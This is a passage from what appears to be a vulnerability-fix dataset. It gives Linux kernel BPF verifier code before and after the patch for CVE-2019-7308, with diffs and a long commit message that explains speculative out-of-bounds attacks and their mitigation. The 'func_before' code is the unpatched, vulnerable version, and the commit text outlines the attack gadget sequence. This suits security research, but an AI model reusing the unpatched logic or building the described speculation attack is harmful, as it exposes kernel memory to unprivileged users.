{\n\t\t\tdst_reg->umin_value = 0;\n\t\t\tdst_reg->umax_value = U64_MAX;\n\t\t} else {\n\t\t\tdst_reg->umin_value <<= umin_val;\n\t\t\tdst_reg->umax_value <<= umax_val;\n\t\t}\n\t\tdst_reg->var_off = tnum_lshift(dst_reg->var_off, umin_val);\n\t\t/* We may learn something more from the var_off */\n\t\t__update_reg_bounds(dst_reg);\n\t\tbreak;\n\tcase BPF_RSH:\n\t\tif (umax_val >= insn_bitness) {\n\t\t\t/* Shifts greater than 31 or 63 are undefined.\n\t\t\t * This includes shifts by a negative number.\n\t\t\t */\n\t\t\tmark_reg_unknown(env, regs, insn->dst_reg);\n\t\t\tbreak;\n\t\t}\n\t\t/* BPF_RSH is an unsigned shift.  If the value in dst_reg might\n\t\t * be negative, then either:\n\t\t * 1) src_reg might be zero, so the sign bit of the result is\n\t\t *    unknown, so we lose our signed bounds\n\t\t * 2) it's known negative, thus the unsigned bounds capture the\n\t\t *    signed bounds\n\t\t * 3) the signed bounds cross zero, so they tell us nothing\n\t\t *    about the result\n\t\t * If the value in dst_reg is known nonnegative, then again the\n\t\t * unsigned bounts capture the signed bounds.\n\t\t * Thus, in all cases it suffices to blow away our signed bounds\n\t\t * and rely on inferring new ones from the unsigned bounds and\n\t\t * var_off of the result.\n\t\t */\n\t\tdst_reg->smin_value = S64_MIN;\n\t\tdst_reg->smax_value = S64_MAX;\n\t\tdst_reg->var_off = tnum_rshift(dst_reg->var_off, umin_val);\n\t\tdst_reg->umin_value >>= umax_val;\n\t\tdst_reg->umax_value >>= umin_val;\n\t\t/* We may learn something more from the var_off */\n\t\t__update_reg_bounds(dst_reg);\n\t\tbreak;\n\tcase BPF_ARSH:\n\t\tif (umax_val >= insn_bitness) {\n\t\t\t/* Shifts greater than 31 or 63 are undefined.\n\t\t\t * This includes shifts by a negative number.\n\t\t\t */\n\t\t\tmark_reg_unknown(env, regs, insn->dst_reg);\n\t\t\tbreak;\n\t\t}\n\n\t\t/* Upon reaching here, src_known is true and\n\t\t * umax_val is equal to umin_val.\n\t\t */\n\t\tdst_reg->smin_value >>= umin_val;\n\t\tdst_reg->smax_value >>= umin_val;\n\t\tdst_reg->var_off = tnum_arshift(dst_reg->var_off, umin_val);\n\n\t\t/* blow away the dst_reg umin_value/umax_value and rely on\n\t\t * dst_reg var_off to refine the result.\n\t\t */\n\t\tdst_reg->umin_value = 0;\n\t\tdst_reg->umax_value = U64_MAX;\n\t\t__update_reg_bounds(dst_reg);\n\t\tbreak;\n\tdefault:\n\t\tmark_reg_unknown(env, regs, insn->dst_reg);\n\t\tbreak;\n\t}\n\n\tif (BPF_CLASS(insn->code) != BPF_ALU64) {\n\t\t/* 32-bit ALU ops are (32,32)->32 */\n\t\tcoerce_reg_to_size(dst_reg, 4);\n\t}\n\n\t__reg_deduce_bounds(dst_reg);\n\t__reg_bound_offset(dst_reg);\n\treturn 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -9,6 +9,8 @@\n \ts64 smin_val, smax_val;\n \tu64 umin_val, umax_val;\n \tu64 insn_bitness = (BPF_CLASS(insn->code) == BPF_ALU64) ? 64 : 32;\n+\tu32 dst = insn->dst_reg;\n+\tint ret;\n \n \tif (insn_bitness == 32) {\n \t\t/* Relevant for 32-bit RSH: Information can propagate towards\n@@ -43,6 +45,11 @@\n \n \tswitch (opcode) {\n \tcase BPF_ADD:\n+\t\tret = sanitize_val_alu(env, insn);\n+\t\tif (ret < 0) {\n+\t\t\tverbose(env, \"R%d tried to add from different pointers or scalars\\n\", dst);\n+\t\t\treturn ret;\n+\t\t}\n \t\tif (signed_add_overflows(dst_reg->smin_value, smin_val) ||\n \t\t    signed_add_overflows(dst_reg->smax_value, smax_val)) {\n \t\t\tdst_reg->smin_value = S64_MIN;\n@@ -62,6 +69,11 @@\n \t\tdst_reg->var_off = tnum_add(dst_reg->var_off, src_reg.var_off);\n \t\tbreak;\n \tcase BPF_SUB:\n+\t\tret = sanitize_val_alu(env, insn);\n+\t\tif (ret < 0) {\n+\t\t\tverbose(env, \"R%d tried to sub from different pointers or scalars\\n\", dst);\n+\t\t\treturn ret;\n+\t\t}\n \t\tif (signed_sub_overflows(dst_reg->smin_value, smax_val) ||\n \t\t    signed_sub_overflows(dst_reg->smax_value, smin_val)) {\n \t\t\t/* Overflow possible, we know nothing */",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\tu32 dst = insn->dst_reg;",
                "\tint ret;",
                "\t\tret = sanitize_val_alu(env, insn);",
                "\t\tif (ret < 0) {",
                "\t\t\tverbose(env, \"R%d tried to add from different pointers or scalars\\n\", dst);",
                "\t\t\treturn ret;",
                "\t\t}",
                "\t\tret = sanitize_val_alu(env, insn);",
                "\t\tif (ret < 0) {",
                "\t\t\tverbose(env, \"R%d tried to sub from different pointers or scalars\\n\", dst);",
                "\t\t\treturn ret;",
                "\t\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2019-7308",
        "func_name": "torvalds/linux/adjust_ptr_min_max_vals",
        "description": "kernel/bpf/verifier.c in the Linux kernel before 4.20.6 performs undesirable out-of-bounds speculation on pointer arithmetic in various cases, including cases of different branches with different state or limits to sanitize, leading to side-channel attacks.",
        "git_url": "https://github.com/torvalds/linux/commit/979d63d50c0c0f7bc537bf821e056cc9fe5abd38",
        "commit_title": "bpf: prevent out of bounds speculation on pointer arithmetic",
        "commit_text": " Jann reported that the original commit back in b2157399cc98 (\"bpf: prevent out-of-bounds speculation\") was not sufficient to stop CPU from speculating out of bounds memory access: While b2157399cc98 only focussed on masking array map access for unprivileged users for tail calls and data access such that the user provided index gets sanitized from BPF program and syscall side, there is still a more generic form affected from BPF programs that applies to most maps that hold user data in relation to dynamic map access when dealing with unknown scalars or \"slow\" known scalars as access offset, for example:    - Load a map value pointer into R6   - Load an index into R7   - Do a slow computation (e.g. with a memory dependency) that     loads a limit into R8 (e.g. load the limit from a map for     high latency, then mask it to make the verifier happy)   - Exit if R7 >= R8 (mispredicted branch)   - Load R0 = R6[R7]   - Load R0 = R6[R0]  For unknown scalars there are two options in the BPF verifier where we could derive knowledge from in order to guarantee safe access to the memory: i) While </>/<=/>= variants won't allow to derive any lower or upper bounds from the unknown scalar where it would be safe to add it to the map value pointer, it is possible through ==/!= test however. ii) another option is to transform the unknown scalar into a known scalar, for example, through ALU ops combination such as R &= <imm> followed by R |= <imm> or any similar combination where the original information from the unknown scalar would be destroyed entirely leaving R with a constant. The initial slow load still precedes the latter ALU ops on that register, so the CPU executes speculatively from that point. Once we have the known scalar, any compare operation would work then. A third option only involving registers with known scalars could be crafted as described in [0] where a CPU port (e.g. Slow Int unit) would be filled with many dependent computations such that the subsequent condition depending on its outcome has to wait for evaluation on its execution port and thereby executing speculatively if the speculated code can be scheduled on a different execution port, or any other form of mistraining as described in [1], for example. Given this is not limited to only unknown scalars, not only map but also stack access is affected since both is accessible for unprivileged users and could potentially be used for out of bounds access under speculation.  In order to prevent any of these cases, the verifier is now sanitizing pointer arithmetic on the offset such that any out of bounds speculation would be masked in a way where the pointer arithmetic result in the destination register will stay unchanged, meaning offset masked into zero similar as in array_index_nospec() case. With regards to implementation, there are three options that were considered: i) new insn for sanitation, ii) push/pop insn and sanitation as inlined BPF, iii) reuse of ax register and sanitation as inlined BPF.  Option i) has the downside that we end up using from reserved bits in the opcode space, but also that we would require each JIT to emit masking as native arch opcodes meaning mitigation would have slow adoption till everyone implements it eventually which is counter-productive. Option ii) and iii) have both in common that a temporary register is needed in order to implement the sanitation as inlined BPF since we are not allowed to modify the source register. While a push / pop insn in ii) would be useful to have in any case, it requires once again that every JIT needs to implement it first. While possible, amount of changes needed would also be unsuitable for a -stable patch. Therefore, the path which has fewer changes, less BPF instructions for the mitigation and does not require anything to be changed in the JITs is option iii) which this work is pursuing. The ax register is already mapped to a register in all JITs (modulo arm32 where it's mapped to stack as various other BPF registers there) and used in constant blinding for JITs-only so far. It can be reused for verifier rewrites under certain constraints. The interpreter's tmp \"register\" has therefore been remapped into extending the register set with hidden ax register and reusing that for a number of instructions that needed the prior temporary variable internally (e.g. div, mod). This allows for zero increase in stack space usage in the interpreter, and enables (restricted) generic use in rewrites otherwise as long as such a patchlet does not make use of these instructions. The sanitation mask is dynamic and relative to the offset the map value or stack pointer currently holds.  There are various cases that need to be taken under consideration for the masking, e.g. such operation could look as follows: ptr += val or val += ptr or ptr -= val. Thus, the value to be sanitized could reside either in source or in destination register, and the limit is different depending on whether the ALU op is addition or subtraction and depending on the current known and bounded offset. The limit is derived as follows: limit := max_value_size - (smin_value + off). For subtraction: limit := umax_value + off. This holds because we do not allow any pointer arithmetic that would temporarily go out of bounds or would have an unknown value with mixed signed bounds where it is unclear at verification time whether the actual runtime value would be either negative or positive. For example, we have a derived map pointer value with constant offset and bounded one, so limit based on smin_value works because the verifier requires that statically analyzed arithmetic on the pointer must be in bounds, and thus it checks if resulting smin_value + off and umax_value + off is still within map value bounds at time of arithmetic in addition to time of access. Similarly, for the case of stack access we derive the limit as follows: MAX_BPF_STACK + off for subtraction and -off for the case of addition where off := ptr_reg->off + ptr_reg->var_off.value. Subtraction is a special case for the masking which can be in form of ptr += -val, ptr -= -val, or ptr -= val. In the first two cases where we know that the value is negative, we need to temporarily negate the value in order to do the sanitation on a positive value where we later swap the ALU op, and restore original source register if the value was in source.  The sanitation of pointer arithmetic alone is still not fully sufficient as is, since a scenario like the following could happen ...    PTR += 0x1000 (e.g. K-based imm)   PTR -= BIG_NUMBER_WITH_SLOW_COMPARISON   PTR += 0x1000   PTR -= BIG_NUMBER_WITH_SLOW_COMPARISON   [...]  ... which under speculation could end up as ...    PTR += 0x1000   PTR -= 0 [ truncated by mitigation ]   PTR += 0x1000   PTR -= 0 [ truncated by mitigation ]   [...]  ... and therefore still access out of bounds. To prevent such case, the verifier is also analyzing safety for potential out of bounds access under speculative execution. Meaning, it is also simulating pointer access under truncation. We therefore \"branch off\" and push the current verification state after the ALU operation with known 0 to the verification stack for later analysis. Given the current path analysis succeeded it is likely that the one under speculation can be pruned. In any case, it is also subject to existing complexity limits and therefore anything beyond this point will be rejected. In terms of pruning, it needs to be ensured that the verification state from speculative execution simulation must never prune a non-speculative execution path, therefore, we mark verifier state accordingly at the time of push_stack(). If verifier detects out of bounds access under speculative execution from one of the possible paths that includes a truncation, it will reject such program.  Given we mask every reg-based pointer arithmetic for unprivileged programs, we've been looking into how it could affect real-world programs in terms of size increase. As the majority of programs are targeted for privileged-only use case, we've unconditionally enabled masking (with its alu restrictions on top of it) for privileged programs for the sake of testing in order to check i) whether they get rejected in its current form, and ii) by how much the number of instructions and size will increase. We've tested this by using Katran, Cilium and test_l4lb from the kernel selftests. For Katran we've evaluated balancer_kern.o, Cilium bpf_lxc.o and an older test object bpf_lxc_opt_-DUNKNOWN.o and l4lb we've used test_l4lb.o as well as test_l4lb_noinline.o. We found that none of the programs got rejected by the verifier with this change, and that impact is rather minimal to none. balancer_kern.o had 13,904 bytes (1,738 insns) xlated and 7,797 bytes JITed before and after the change. Most complex program in bpf_lxc.o had 30,544 bytes (3,817 insns) xlated and 18,538 bytes JITed before and after and none of the other tail call programs in bpf_lxc.o had any changes either. For the older bpf_lxc_opt_-DUNKNOWN.o object we found a small increase from 20,616 bytes (2,576 insns) and 12,536 bytes JITed before to 20,664 bytes (2,582 insns) and 12,558 bytes JITed after the change. Other programs from that object file had similar small increase. Both test_l4lb.o had no change and remained at 6,544 bytes (817 insns) xlated and 3,401 bytes JITed and for test_l4lb_noinline.o constant at 5,080 bytes (634 insns) xlated and 3,313 bytes JITed. This can be explained in that LLVM typically optimizes stack based pointer arithmetic by using K-based operations and that use of dynamic map access is not overly frequent. However, in future we may decide to optimize the algorithm further under known guarantees from branch and value speculation. Latter seems also unclear in terms of prediction heuristics that today's CPUs apply as well as whether there could be collisions in e.g. the predictor's Value History/Pattern Table for triggering out of bounds access, thus masking is performed unconditionally at this point but could be subject to relaxation later on. We were generally also brainstorming various other approaches for mitigation, but the blocker was always lack of available registers at runtime and/or overhead for runtime tracking of limits belonging to a specific pointer. Thus, we found this to be minimally intrusive under given constraints.  With that in place, a simple example with sanitized access on unprivileged load at post-verification time looks as follows:    # bpftool prog dump xlated id 282   [...]   28: (79) r1 = *(u64 *)(r7 +0)   29: (79) r2 = *(u64 *)(r7 +8)   30: (57) r1 &= 15   31: (79) r3 = *(u64 *)(r0 +4608)   32: (57) r3 &= 1   33: (47) r3 |= 1   34: (2d) if r2 > r3 goto pc+19   35: (b4) (u32) r11 = (u32) 20479  |   36: (1f) r11 -= r2                | Dynamic sanitation for pointer   37: (4f) r11 |= r2                | arithmetic with registers   38: (87) r11 = -r11               | containing bounded or known   39: (c7) r11 s>>= 63              | scalars in order to prevent   40: (5f) r11 &= r2                | out of bounds speculation.   41: (0f) r4 += r11                |   42: (71) r4 = *(u8 *)(r4 +0)   43: (6f) r4 <<= r1   [...]  For the case where the scalar sits in the destination register as opposed to the source register, the following code is emitted for the above example:    [...]   16: (b4) (u32) r11 = (u32) 20479   17: (1f) r11 -= r2   18: (4f) r11 |= r2   19: (87) r11 = -r11   20: (c7) r11 s>>= 63   21: (5f) r2 &= r11   22: (0f) r2 += r0   23: (61) r0 = *(u32 *)(r2 +0)   [...]  JIT blinding example with non-conflicting use of r10:    [...]    d5:\tje     0x0000000000000106    _    d7:\tmov    0x0(%rax),%edi       |    da:\tmov    $0xf153246,%r10d     | Index load from map value and    e0:\txor    $0xf153259,%r10      | (const blinded) mask with 0x1f.    e7:\tand    %r10,%rdi            |_    ea:\tmov    $0x2f,%r10d          |    f0:\tsub    %rdi,%r10            | Sanitized addition. Both use r10    f3:\tor     %rdi,%r10            | but do not interfere with each    f6:\tneg    %r10                 | other. (Neither do these instructions    f9:\tsar    $0x3f,%r10           | interfere with the use of ax as temp    fd:\tand    %r10,%rdi            | in interpreter.)   100:\tadd    %rax,%rdi            |_   103:\tmov    0x0(%rdi),%eax  [...]  Tested that it fixes Jann's reproducer, and also checked that test_verifier and test_progs suite with interpreter, JIT and JIT with hardening enabled on x86-64 and arm64 runs successfully.    [0] Speculose: Analyzing the Security Implications of Speculative       Execution in CPUs, Giorgi Maisuradze and Christian Rossow,       https://arxiv.org/pdf/1801.04084.pdf    [1] A Systematic Evaluation of Transient Execution Attacks and       Defenses, Claudio Canella, Jo Van Bulck, Michael Schwarz,       Moritz Lipp, Benjamin von Berg, Philipp Ortner, Frank Piessens,       Dmitry Evtyushkin, Daniel Gruss,       https://arxiv.org/pdf/1811.05441.pdf ",
        "func_before": "static int adjust_ptr_min_max_vals(struct bpf_verifier_env *env,\n\t\t\t\t   struct bpf_insn *insn,\n\t\t\t\t   const struct bpf_reg_state *ptr_reg,\n\t\t\t\t   const struct bpf_reg_state *off_reg)\n{\n\tstruct bpf_verifier_state *vstate = env->cur_state;\n\tstruct bpf_func_state *state = vstate->frame[vstate->curframe];\n\tstruct bpf_reg_state *regs = state->regs, *dst_reg;\n\tbool known = tnum_is_const(off_reg->var_off);\n\ts64 smin_val = off_reg->smin_value, smax_val = off_reg->smax_value,\n\t    smin_ptr = ptr_reg->smin_value, smax_ptr = ptr_reg->smax_value;\n\tu64 umin_val = off_reg->umin_value, umax_val = off_reg->umax_value,\n\t    umin_ptr = ptr_reg->umin_value, umax_ptr = ptr_reg->umax_value;\n\tu32 dst = insn->dst_reg, src = insn->src_reg;\n\tu8 opcode = BPF_OP(insn->code);\n\n\tdst_reg = &regs[dst];\n\n\tif ((known && (smin_val != smax_val || umin_val != umax_val)) ||\n\t    smin_val > smax_val || umin_val > umax_val) {\n\t\t/* Taint dst register if offset had invalid bounds derived from\n\t\t * e.g. dead branches.\n\t\t */\n\t\t__mark_reg_unknown(dst_reg);\n\t\treturn 0;\n\t}\n\n\tif (BPF_CLASS(insn->code) != BPF_ALU64) {\n\t\t/* 32-bit ALU ops on pointers produce (meaningless) scalars */\n\t\tverbose(env,\n\t\t\t\"R%d 32-bit pointer arithmetic prohibited\\n\",\n\t\t\tdst);\n\t\treturn -EACCES;\n\t}\n\n\tswitch (ptr_reg->type) {\n\tcase PTR_TO_MAP_VALUE_OR_NULL:\n\t\tverbose(env, \"R%d pointer arithmetic on %s prohibited, null-check it first\\n\",\n\t\t\tdst, reg_type_str[ptr_reg->type]);\n\t\treturn -EACCES;\n\tcase CONST_PTR_TO_MAP:\n\tcase PTR_TO_PACKET_END:\n\tcase PTR_TO_SOCKET:\n\tcase PTR_TO_SOCKET_OR_NULL:\n\t\tverbose(env, \"R%d pointer arithmetic on %s prohibited\\n\",\n\t\t\tdst, reg_type_str[ptr_reg->type]);\n\t\treturn -EACCES;\n\tcase PTR_TO_MAP_VALUE:\n\t\tif (!env->allow_ptr_leaks && !known && (smin_val < 0) != (smax_val < 0)) {\n\t\t\tverbose(env, \"R%d has unknown scalar with mixed signed bounds, pointer arithmetic with it prohibited for !root\\n\",\n\t\t\t\toff_reg == dst_reg ? dst : src);\n\t\t\treturn -EACCES;\n\t\t}\n\t\t/* fall-through */\n\tdefault:\n\t\tbreak;\n\t}\n\n\t/* In case of 'scalar += pointer', dst_reg inherits pointer type and id.\n\t * The id may be overwritten later if we create a new variable offset.\n\t */\n\tdst_reg->type = ptr_reg->type;\n\tdst_reg->id = ptr_reg->id;\n\n\tif (!check_reg_sane_offset(env, off_reg, ptr_reg->type) ||\n\t    !check_reg_sane_offset(env, ptr_reg, ptr_reg->type))\n\t\treturn -EINVAL;\n\n\tswitch (opcode) {\n\tcase BPF_ADD:\n\t\t/* We can take a fixed offset as long as it doesn't overflow\n\t\t * the s32 'off' field\n\t\t */\n\t\tif (known && (ptr_reg->off + smin_val ==\n\t\t\t      (s64)(s32)(ptr_reg->off + smin_val))) {\n\t\t\t/* pointer += K.  Accumulate it into fixed offset */\n\t\t\tdst_reg->smin_value = smin_ptr;\n\t\t\tdst_reg->smax_value = smax_ptr;\n\t\t\tdst_reg->umin_value = umin_ptr;\n\t\t\tdst_reg->umax_value = umax_ptr;\n\t\t\tdst_reg->var_off = ptr_reg->var_off;\n\t\t\tdst_reg->off = ptr_reg->off + smin_val;\n\t\t\tdst_reg->raw = ptr_reg->raw;\n\t\t\tbreak;\n\t\t}\n\t\t/* A new variable offset is created.  Note that off_reg->off\n\t\t * == 0, since it's a scalar.\n\t\t * dst_reg gets the pointer type and since some positive\n\t\t * integer value was added to the pointer, give it a new 'id'\n\t\t * if it's a PTR_TO_PACKET.\n\t\t * this creates a new 'base' pointer, off_reg (variable) gets\n\t\t * added into the variable offset, and we copy the fixed offset\n\t\t * from ptr_reg.\n\t\t */\n\t\tif (signed_add_overflows(smin_ptr, smin_val) ||\n\t\t    signed_add_overflows(smax_ptr, smax_val)) {\n\t\t\tdst_reg->smin_value = S64_MIN;\n\t\t\tdst_reg->smax_value = S64_MAX;\n\t\t} else {\n\t\t\tdst_reg->smin_value = smin_ptr + smin_val;\n\t\t\tdst_reg->smax_value = smax_ptr + smax_val;\n\t\t}\n\t\tif (umin_ptr + umin_val < umin_ptr ||\n\t\t    umax_ptr + umax_val < umax_ptr) {\n\t\t\tdst_reg->umin_value = 0;\n\t\t\tdst_reg->umax_value = U64_MAX;\n\t\t} else {\n\t\t\tdst_reg->umin_value = umin_ptr + umin_val;\n\t\t\tdst_reg->umax_value = umax_ptr + umax_val;\n\t\t}\n\t\tdst_reg->var_off = tnum_add(ptr_reg->var_off, off_reg->var_off);\n\t\tdst_reg->off = ptr_reg->off;\n\t\tdst_reg->raw = ptr_reg->raw;\n\t\tif (reg_is_pkt_pointer(ptr_reg)) {\n\t\t\tdst_reg->id = ++env->id_gen;\n\t\t\t/* something was added to pkt_ptr, set range to zero */\n\t\t\tdst_reg->raw = 0;\n\t\t}\n\t\tbreak;\n\tcase BPF_SUB:\n\t\tif (dst_reg == off_reg) {\n\t\t\t/* scalar -= pointer.  Creates an unknown scalar */\n\t\t\tverbose(env, \"R%d tried to subtract pointer from scalar\\n\",\n\t\t\t\tdst);\n\t\t\treturn -EACCES;\n\t\t}\n\t\t/* We don't allow subtraction from FP, because (according to\n\t\t * test_verifier.c test \"invalid fp arithmetic\", JITs might not\n\t\t * be able to deal with it.\n\t\t */\n\t\tif (ptr_reg->type == PTR_TO_STACK) {\n\t\t\tverbose(env, \"R%d subtraction from stack pointer prohibited\\n\",\n\t\t\t\tdst);\n\t\t\treturn -EACCES;\n\t\t}\n\t\tif (known && (ptr_reg->off - smin_val ==\n\t\t\t      (s64)(s32)(ptr_reg->off - smin_val))) {\n\t\t\t/* pointer -= K.  Subtract it from fixed offset */\n\t\t\tdst_reg->smin_value = smin_ptr;\n\t\t\tdst_reg->smax_value = smax_ptr;\n\t\t\tdst_reg->umin_value = umin_ptr;\n\t\t\tdst_reg->umax_value = umax_ptr;\n\t\t\tdst_reg->var_off = ptr_reg->var_off;\n\t\t\tdst_reg->id = ptr_reg->id;\n\t\t\tdst_reg->off = ptr_reg->off - smin_val;\n\t\t\tdst_reg->raw = ptr_reg->raw;\n\t\t\tbreak;\n\t\t}\n\t\t/* A new variable offset is created.  If the subtrahend is known\n\t\t * nonnegative, then any reg->range we had before is still good.\n\t\t */\n\t\tif (signed_sub_overflows(smin_ptr, smax_val) ||\n\t\t    signed_sub_overflows(smax_ptr, smin_val)) {\n\t\t\t/* Overflow possible, we know nothing */\n\t\t\tdst_reg->smin_value = S64_MIN;\n\t\t\tdst_reg->smax_value = S64_MAX;\n\t\t} else {\n\t\t\tdst_reg->smin_value = smin_ptr - smax_val;\n\t\t\tdst_reg->smax_value = smax_ptr - smin_val;\n\t\t}\n\t\tif (umin_ptr < umax_val) {\n\t\t\t/* Overflow possible, we know nothing */\n\t\t\tdst_reg->umin_value = 0;\n\t\t\tdst_reg->umax_value = U64_MAX;\n\t\t} else {\n\t\t\t/* Cannot overflow (as long as bounds are consistent) */\n\t\t\tdst_reg->umin_value = umin_ptr - umax_val;\n\t\t\tdst_reg->umax_value = umax_ptr - umin_val;\n\t\t}\n\t\tdst_reg->var_off = tnum_sub(ptr_reg->var_off, off_reg->var_off);\n\t\tdst_reg->off = ptr_reg->off;\n\t\tdst_reg->raw = ptr_reg->raw;\n\t\tif (reg_is_pkt_pointer(ptr_reg)) {\n\t\t\tdst_reg->id = ++env->id_gen;\n\t\t\t/* something was added to pkt_ptr, set range to zero */\n\t\t\tif (smin_val < 0)\n\t\t\t\tdst_reg->raw = 0;\n\t\t}\n\t\tbreak;\n\tcase BPF_AND:\n\tcase BPF_OR:\n\tcase BPF_XOR:\n\t\t/* bitwise ops on pointers are troublesome, prohibit. */\n\t\tverbose(env, \"R%d bitwise operator %s on pointer prohibited\\n\",\n\t\t\tdst, bpf_alu_string[opcode >> 4]);\n\t\treturn -EACCES;\n\tdefault:\n\t\t/* other operators (e.g. MUL,LSH) produce non-pointer results */\n\t\tverbose(env, \"R%d pointer arithmetic with %s operator prohibited\\n\",\n\t\t\tdst, bpf_alu_string[opcode >> 4]);\n\t\treturn -EACCES;\n\t}\n\n\tif (!check_reg_sane_offset(env, dst_reg, ptr_reg->type))\n\t\treturn -EINVAL;\n\n\t__update_reg_bounds(dst_reg);\n\t__reg_deduce_bounds(dst_reg);\n\t__reg_bound_offset(dst_reg);\n\n\t/* For unprivileged we require that resulting offset must be in bounds\n\t * in order to be able to sanitize access later on.\n\t */\n\tif (!env->allow_ptr_leaks) {\n\t\tif (dst_reg->type == PTR_TO_MAP_VALUE &&\n\t\t    check_map_access(env, dst, dst_reg->off, 1, false)) {\n\t\t\tverbose(env, \"R%d pointer arithmetic of map value goes out of range, \"\n\t\t\t\t\"prohibited for !root\\n\", dst);\n\t\t\treturn -EACCES;\n\t\t} else if (dst_reg->type == PTR_TO_STACK &&\n\t\t\t   check_stack_access(env, dst_reg, dst_reg->off +\n\t\t\t\t\t      dst_reg->var_off.value, 1)) {\n\t\t\tverbose(env, \"R%d stack pointer arithmetic goes out of range, \"\n\t\t\t\t\"prohibited for !root\\n\", dst);\n\t\t\treturn -EACCES;\n\t\t}\n\t}\n\n\treturn 0;\n}",
        "func": "static int adjust_ptr_min_max_vals(struct bpf_verifier_env *env,\n\t\t\t\t   struct bpf_insn *insn,\n\t\t\t\t   const struct bpf_reg_state *ptr_reg,\n\t\t\t\t   const struct bpf_reg_state *off_reg)\n{\n\tstruct bpf_verifier_state *vstate = env->cur_state;\n\tstruct bpf_func_state *state = vstate->frame[vstate->curframe];\n\tstruct bpf_reg_state *regs = state->regs, *dst_reg;\n\tbool known = tnum_is_const(off_reg->var_off);\n\ts64 smin_val = off_reg->smin_value, smax_val = off_reg->smax_value,\n\t    smin_ptr = ptr_reg->smin_value, smax_ptr = ptr_reg->smax_value;\n\tu64 umin_val = off_reg->umin_value, umax_val = off_reg->umax_value,\n\t    umin_ptr = ptr_reg->umin_value, umax_ptr = ptr_reg->umax_value;\n\tu32 dst = insn->dst_reg, src = insn->src_reg;\n\tu8 opcode = BPF_OP(insn->code);\n\tint ret;\n\n\tdst_reg = &regs[dst];\n\n\tif ((known && (smin_val != smax_val || umin_val != umax_val)) ||\n\t    smin_val > smax_val || umin_val > umax_val) {\n\t\t/* Taint dst register if offset had invalid bounds derived from\n\t\t * e.g. dead branches.\n\t\t */\n\t\t__mark_reg_unknown(dst_reg);\n\t\treturn 0;\n\t}\n\n\tif (BPF_CLASS(insn->code) != BPF_ALU64) {\n\t\t/* 32-bit ALU ops on pointers produce (meaningless) scalars */\n\t\tverbose(env,\n\t\t\t\"R%d 32-bit pointer arithmetic prohibited\\n\",\n\t\t\tdst);\n\t\treturn -EACCES;\n\t}\n\n\tswitch (ptr_reg->type) {\n\tcase PTR_TO_MAP_VALUE_OR_NULL:\n\t\tverbose(env, \"R%d pointer arithmetic on %s prohibited, null-check it first\\n\",\n\t\t\tdst, reg_type_str[ptr_reg->type]);\n\t\treturn -EACCES;\n\tcase CONST_PTR_TO_MAP:\n\tcase PTR_TO_PACKET_END:\n\tcase PTR_TO_SOCKET:\n\tcase PTR_TO_SOCKET_OR_NULL:\n\t\tverbose(env, \"R%d pointer arithmetic on %s prohibited\\n\",\n\t\t\tdst, reg_type_str[ptr_reg->type]);\n\t\treturn -EACCES;\n\tcase PTR_TO_MAP_VALUE:\n\t\tif (!env->allow_ptr_leaks && !known && (smin_val < 0) != (smax_val < 0)) {\n\t\t\tverbose(env, \"R%d has unknown scalar with mixed signed bounds, pointer arithmetic with it prohibited for !root\\n\",\n\t\t\t\toff_reg == dst_reg ? dst : src);\n\t\t\treturn -EACCES;\n\t\t}\n\t\t/* fall-through */\n\tdefault:\n\t\tbreak;\n\t}\n\n\t/* In case of 'scalar += pointer', dst_reg inherits pointer type and id.\n\t * The id may be overwritten later if we create a new variable offset.\n\t */\n\tdst_reg->type = ptr_reg->type;\n\tdst_reg->id = ptr_reg->id;\n\n\tif (!check_reg_sane_offset(env, off_reg, ptr_reg->type) ||\n\t    !check_reg_sane_offset(env, ptr_reg, ptr_reg->type))\n\t\treturn -EINVAL;\n\n\tswitch (opcode) {\n\tcase BPF_ADD:\n\t\tret = sanitize_ptr_alu(env, insn, ptr_reg, dst_reg, smin_val < 0);\n\t\tif (ret < 0) {\n\t\t\tverbose(env, \"R%d tried to add from different maps or paths\\n\", dst);\n\t\t\treturn ret;\n\t\t}\n\t\t/* We can take a fixed offset as long as it doesn't overflow\n\t\t * the s32 'off' field\n\t\t */\n\t\tif (known && (ptr_reg->off + smin_val ==\n\t\t\t      (s64)(s32)(ptr_reg->off + smin_val))) {\n\t\t\t/* pointer += K.  Accumulate it into fixed offset */\n\t\t\tdst_reg->smin_value = smin_ptr;\n\t\t\tdst_reg->smax_value = smax_ptr;\n\t\t\tdst_reg->umin_value = umin_ptr;\n\t\t\tdst_reg->umax_value = umax_ptr;\n\t\t\tdst_reg->var_off = ptr_reg->var_off;\n\t\t\tdst_reg->off = ptr_reg->off + smin_val;\n\t\t\tdst_reg->raw = ptr_reg->raw;\n\t\t\tbreak;\n\t\t}\n\t\t/* A new variable offset is created.  Note that off_reg->off\n\t\t * == 0, since it's a scalar.\n\t\t * dst_reg gets the pointer type and since some positive\n\t\t * integer value was added to the pointer, give it a new 'id'\n\t\t * if it's a PTR_TO_PACKET.\n\t\t * this creates a new 'base' pointer, off_reg (variable) gets\n\t\t * added into the variable offset, and we copy the fixed offset\n\t\t * from ptr_reg.\n\t\t */\n\t\tif (signed_add_overflows(smin_ptr, smin_val) ||\n\t\t    signed_add_overflows(smax_ptr, smax_val)) {\n\t\t\tdst_reg->smin_value = S64_MIN;\n\t\t\tdst_reg->smax_value = S64_MAX;\n\t\t} else {\n\t\t\tdst_reg->smin_value = smin_ptr + smin_val;\n\t\t\tdst_reg->smax_value = smax_ptr + smax_val;\n\t\t}\n\t\tif (umin_ptr + umin_val < umin_ptr ||\n\t\t    umax_ptr + umax_val < umax_ptr) {\n\t\t\tdst_reg->umin_value = 0;\n\t\t\tdst_reg->umax_value = U64_MAX;\n\t\t} else {\n\t\t\tdst_reg->umin_value = umin_ptr + umin_val;\n\t\t\tdst_reg->umax_value = umax_ptr + umax_val;\n\t\t}\n\t\tdst_reg->var_off = tnum_add(ptr_reg->var_off, off_reg->var_off);\n\t\tdst_reg->off = ptr_reg->off;\n\t\tdst_reg->raw = ptr_reg->raw;\n\t\tif (reg_is_pkt_pointer(ptr_reg)) {\n\t\t\tdst_reg->id = ++env->id_gen;\n\t\t\t/* something was added to pkt_ptr, set range to zero */\n\t\t\tdst_reg->raw = 0;\n\t\t}\n\t\tbreak;\n\tcase BPF_SUB:\n\t\tret = sanitize_ptr_alu(env, insn, ptr_reg, dst_reg, smin_val < 0);\n\t\tif (ret < 0) {\n\t\t\tverbose(env, \"R%d tried to sub from different maps or paths\\n\", 